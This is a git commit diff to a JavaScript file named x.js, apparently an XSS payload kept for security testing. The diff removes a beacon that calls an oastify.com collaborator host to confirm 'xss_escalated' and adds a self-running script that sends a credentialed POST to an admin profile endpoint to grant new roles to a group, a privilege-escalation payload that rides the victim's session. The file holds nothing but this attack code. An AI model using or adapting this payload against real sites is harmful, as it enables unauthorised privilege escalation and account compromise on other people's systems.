307f5803eca73ca70999754e384e0e87a89fa1c2
BoxBoxShell <127796580+BoxBoxShell@users.noreply.github.com>
2025-05-02 14:01:51 +0000

    Update x.js

--- x.js
+++ x.js
@@ -1,1 +1,19 @@
-new Image().src = 'https://fl4wwyb6t196y5j2ne6f76kc53bzzpne.oastify.com/hit?stage=xss_escalated';
+(() => {
+  const token = Date.now();
+  const data = 'pid=oslo_test&unique=' + token +
+    '&action=save_members&group_id=6' +
+    '&added_permissions=%7B%7D' +
+    '&removed_permissions=%7B%7D' +
+    '&added_roles=' + encodeURIComponent('{"1001":{"93940":1}}') +
+    '&removed_roles=%7B%7D&su=';
+
+  fetch('/cgi-bin/admin/person/admin_profile.pl', {
+    method: 'POST',
+    credentials: 'include',
+    headers: {
+      'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
+      'X-Requested-With': 'XMLHttpRequest'
+    },
+    body: data
+  });
+})();
